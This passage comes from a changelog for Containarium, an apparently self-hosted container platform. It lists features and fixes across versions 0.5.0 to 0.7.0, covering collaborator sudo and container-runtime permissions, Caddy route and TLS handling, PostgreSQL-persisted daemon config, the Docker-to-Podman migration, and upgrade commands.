- Updated `SPOT-RECOVERY.md`, `SPOT-INSTANCES-AND-SCALING.md`, `HORIZONTAL-SCALING-ARCHITECTURE.md`, `terraform/gce/README.md` to reference new `SENTINEL-DESIGN.md`
- Sentinel startup script: fixed `systemctl restart sshd` → `ssh || sshd || true` for Ubuntu compatibility

## [0.7.0] - 2026-02-25

### Added
- **Collaborator permission levels** — fine-grained access control when adding collaborators
  - `--sudo` flag grants full sudo access (`ALL=(ALL) NOPASSWD: ALL`) instead of restricted `su - owner`
  - `--container-runtime` flag adds collaborator to docker/podman groups for container runtime access
  - New proto fields: `grant_sudo`, `grant_container_runtime` on `AddCollaboratorRequest`; `has_sudo`, `has_container_runtime` on `Collaborator`
  - PostgreSQL schema migration adds `has_sudo` and `has_container_runtime` columns
  - Web UI: checkboxes in Add Collaborator form, permission badges (sudo/docker chips) in collaborator table
  - CLI: `containarium collaborator add alice bob --ssh-key bob.pub --sudo --container-runtime`
- **Docker CE software stack** — proper Docker installation as a stack option
  - New `docker` stack in `configs/stacks.yaml` with Docker CE apt repository setup
  - Installs `docker-ce`, `docker-ce-cli`, `containerd.io`, `docker-compose-plugin`
  - Automatically adds user to `docker` group when docker stack is selected
  - Web UI: Docker Development option in stack selection dropdown
- **Stack pre-install commands** — `pre_install` field in Stack struct for commands that run as root before `apt-get install` (e.g., adding apt repositories)
- **Daemon config persistence in PostgreSQL** for self-bootstrapping after VM recreation
  - New `daemon_config` key-value table stores: `base_domain`, `http_port`, `grpc_port`, `listen_address`, `enable_mtls`, `enable_rest`, `enable_app_hosting`
  - Auto-detect PostgreSQL container IP from Incus (`containarium-core-postgres`) — no `--postgres` flag needed
  - On startup, loads saved config from DB; CLI flags always override DB values (`cmd.Flags().Changed()`)
  - On successful start, saves current config back to DB for next boot
  - New `DaemonConfigStore` in `internal/app/daemon_config_store.go` with `Get`, `Set`, `GetAll`, `SetAll` methods
  - Systemd service reduced from 6 flags to 2: `--rest --jwt-secret-file /etc/containarium/jwt.secret`
  - JWT secret intentionally kept out of PostgreSQL (remains on filesystem)
- **`containarium service install` command** for single-command systemd service setup
  - Writes the canonical service file with correct `ReadWritePaths` (includes `/var/lock` for useradd flock)
  - Generates JWT secret file if it doesn't exist
  - Enables and starts the service automatically
  - Replaces inline heredocs in `hacks/install.sh`, `terraform/gce/scripts/startup.sh`, and `startup-spot.sh`
  - Also: `containarium service status` and `containarium service uninstall`
- **AppServer graceful degradation** — `/v1/apps` returns empty list instead of 501 when app hosting is disabled
- Collaborator management for containers (add/remove/list collaborators)

### Fixed
- **Route domain doubling in Caddy**: Routes with independent FQDNs (e.g., `api.example.com`) were incorrectly getting the base domain appended (`api.example.com.<cluster>.example.com`), causing TLS and routing failures. Fixed `ProxyManager.addRouteWithProtocol()` to only append base domain for simple subdomains (no dots), leaving FQDNs as-is.
- **Routes API returning empty when app-hosting disabled**: The `/v1/network/routes` endpoint returned no routes because the standalone route store (created when `--app-hosting` is off) was never assigned to `NetworkServer`. Routes existed in PostgreSQL and synced to Caddy correctly, but the API couldn't serve them.
- **Route sync loop churning every 5 seconds**: The domain doubling bug caused a perpetual add/remove cycle (`+4 added, -4 removed` every tick) because Caddy's doubled domains never matched PostgreSQL's correct domains.
- **Useradd lock file on read-only filesystem**: `flock /var/lock/containarium-useradd.lock` failed with `ProtectSystem=strict` because `/var/lock` was not in `ReadWritePaths`. Now included in the canonical service template.
- Force remove agent when creating user container
- Persist Caddy route records into PostgreSQL as single source of truth
- Startup deadlock

## [0.6.0] - 2026-02-15

### Added

- Target IP dropdown shows running containers with name and IP
- Routes managed via Caddy Admin API for dynamic configuration
- New API endpoint: `GET /v1/network/dns-records` for domain suggestions

#### gRPC Proxy Support
- Added protocol selection (HTTP/gRPC) when creating proxy routes
- gRPC routes use HTTP/2 (h2c) transport for backend communication
- Caddy reverse proxy automatically configured with correct protocol handling
- New `RouteProtocol` enum in proto: `ROUTE_PROTOCOL_HTTP`, `ROUTE_PROTOCOL_GRPC`
- Protocol field added to `ProxyRoute`, `AddRouteRequest`, `UpdateRouteRequest`
- Web UI shows protocol column in routes table (HTTP/gRPC chip)
- Protocol selector dropdown in Add Route dialog
- Backend support via `NewGRPCTransport()` and `AddGRPCRoute()` in proxy manager

#### TCP/UDP Passthrough Routes
- Added passthrough route support for direct TCP/UDP port forwarding via iptables
- Ideal for mTLS gRPC services where TLS should not be terminated at proxy
- Unified routes view in Web UI showing both proxy and passthrough routes
- Route type selector in Add Route dialog: Proxy (TLS terminated) vs Passthrough (direct)
- New proto definitions: `RouteType` enum, `PassthroughRoute` message

- Web UI visual distinction: Proxy routes (🌐) vs Passthrough routes (🔌)

#### Automatic TLS Certificate Provisioning
- New `ProvisionTLS()` method in ProxyManager for automatic SSL certificate provisioning
- When adding a route, Caddy automatically obtains a TLS certificate for the domain
- Adds domain to Caddy's TLS automation policy with ACME (Let's Encrypt) and ZeroSSL issuers
- Graceful fallback: if TLS provisioning fails, route is still added (may use wildcard cert)
- See [docs/TLS-PROVISIONING.md](docs/TLS-PROVISIONING.md) for detailed documentation

#### Disaster Recovery Command
- See [docs/DISASTER-RECOVERY.md](docs/DISASTER-RECOVERY.md) for detailed documentation

### Changed

#### Docker to Podman Migration
- **BREAKING**: Replaced Docker with Podman as the container runtime inside LXC containers
- Renamed proto fields: `enable_docker` → `enable_podman`, `docker_enabled` → `podman_enabled`
- Updated CLI flag: `--docker` → `--podman` (default: true)
- Updated Web UI: "Enable Docker" checkbox → "Enable Podman" checkbox
- **Podman 5.x from Kubic repository**: Uses OpenSUSE Kubic unstable repository for latest Podman versions (5.x) instead of Ubuntu's default (4.9.x)
- **podman-compose via pip**: Installs podman-compose from PyPI for latest version instead of apt package
- Podman provides Docker-compatible CLI (`podman` commands work like `docker`)
- Note: Dockerfile naming kept as standard (works with both Docker and Podman)

- Dashboard "CPU Cores" section renamed to "CPU Load" with usage visualization
- Route management moved from Apps tab to Network tab exclusively
- `RemoveRoute` now properly extracts subdomain from full domain for deletion
- Added fallback deletion by route index when routes lack `@id` field
- **Auto-detect Caddy container IP**: When `--app-hosting` is enabled and `--caddy-admin-url` is not specified, the daemon automatically finds a running container with "caddy" in its name and uses its IP for the Caddy Admin API (e.g., `http://10.0.3.111:2019`)
- **Type-safe Caddy API**: Refactored `proxy.go` to use strongly-typed structs instead of `map[string]interface{}` for Caddy API interactions. New types include `CaddyRouteTyped`, `CaddyReverseProxyHandler`, `CaddyTLSAutomationPolicy`, `CaddyTLSIssuer`, and helper functions like `NewTLSPolicy()` and `NewReverseProxyRoute()`

### Fixed
- Fixed route deletion when full domain is passed instead of subdomain
- Fixed routes created via Caddyfile not being deletable (missing @id)
- Fixed WebUI static files not being embedded correctly after build
- **Fixed port forwarding blocking container outbound HTTPS**: iptables PREROUTING rules now exclude the entire container network CIDR (`! -s 10.x.x.0/24`) instead of just Caddy's IP. This allows all containers to access external HTTPS services (Docker Hub, Let's Encrypt, etc.)
- Fixed route display showing `ip:port:0` format by properly parsing Caddy's `Dial` field into separate IP and port fields

## [0.5.0] - 2026-02-10

- **Network/Routes 500 errors** - Fixed nil pointer issues when Caddy proxy is not configured
- **Node.js buildpack `npm ci` failure** - Fixed Dockerfile generation to use `npm install --omit=dev` when `package-lock.json` is missing, falls back to `npm ci --omit=dev` when lock file exists
- **PostgreSQL timestamp encoding** - Fixed `deployedAt` field type from `*interface{}` to `*time.Time` for proper database encoding
- **Caddy server name mismatch** - Fixed ProxyManager to use `srv0` (Caddyfile default) instead of hardcoded `main`, now configurable via `SetServerName()`
- **Docker AppArmor permission denied** - Added privileged mode and AppArmor unconfined profile for Docker-in-Docker support
- **Network subnet conflicts** - Previously manual network setup could conflict with host network
  - Auto-initialization uses safe default `10.100.0.1/24` instead of common `10.0.3.0/24`
  - Prevents loss of connectivity when running Containarium inside LXC containers

  - Dual-protocol support: gRPC (port 50051) + REST (port 8080)
  - Backward compatible - existing gRPC clients unaffected
- **JWT token authentication** for REST API
  - Bearer token authentication with configurable expiry

  - `--swagger-dir` - Swagger files directory
- **Complete upgrade system** for the entire Containarium stack:
  - `containarium upgrade self` - Upgrade Containarium binary from GitHub releases
  - `containarium upgrade host` - Upgrade host dependencies (Incus, system packages, kernel modules)
  - `containarium upgrade containers` - Upgrade software inside containers (Docker, base OS, tools)
  - `containarium upgrade all` - Upgrade everything in the correct order
- **Changelog display** during upgrades - shows release notes before upgrading
- **Runtime version checking** with warnings for outdated components
- **Rolling upgrades** for containers (`--rolling` flag) to minimize downtime
- **Reboot detection** - automatically detects if system reboot is required after upgrade
- **Mock server** for local testing of upgrade commands (`test/mock-server.py`)
- **Test fixtures** for upgrade testing without needing real releases

### Fixed
- Docker build support by requiring Incus 6.19+ (fixes CVE-2025-52881 AppArmor bug)
- Terraform startup scripts now install Incus from Zabbly repository
- All Terraform startup scripts updated for Incus 6.19+
- Fixed typo in proto package name: `continariumv1` → `containariumv1`
- **JWT secret handling** - Fixed trailing newline issues when reading JWT secrets from files
- **Gateway mTLS connection** - Fixed HTTP gateway to properly connect to gRPC server with mTLS
- **Installation script (`hacks/install.sh`)** - Multiple critical fixes:
  - Fixed Incus package conflict by adding APT pinning to prioritize Zabbly repository over Ubuntu
  - Added `--batch --yes` flags to GPG commands for non-interactive SSH installation
  - Changed `incus-tools` to `incus-extra` (newer package name in Zabbly repository)
  - Fixed systemd service permissions (`ProtectSystem=false`, `ProtectHome=false`)
  - Added automatic TLS certificate generation step for mTLS
- **Google Guest Agent race condition** - Fixed `/etc/passwd` lock conflicts during user creation
  - Stop google-guest-agent → remove stale locks → create user → restart agent
  - Prevents "cannot lock /etc/passwd; try again later" errors
- **Container creation improvements**:
  - Fixed image format parsing to support both `ubuntu:24.04` and `images:ubuntu/24.04` formats
  - Fixed SSH directory creation (`.ssh` not created before writing `authorized_keys`)
  - Added `--force` flag to delete and recreate existing containers
- **StopContainer API** - Fixed to use proper API field (`Force: true`) instead of string action

### Changed
- Updated documentation with Incus 6.19+ system requirements
- Renamed `upgrade incus` to `upgrade host` for better clarity (includes more than just Incus)
- Upgrade commands now provide detailed progress and status information
- Proto generation now includes grpc-gateway and OpenAPI plugins

### Security
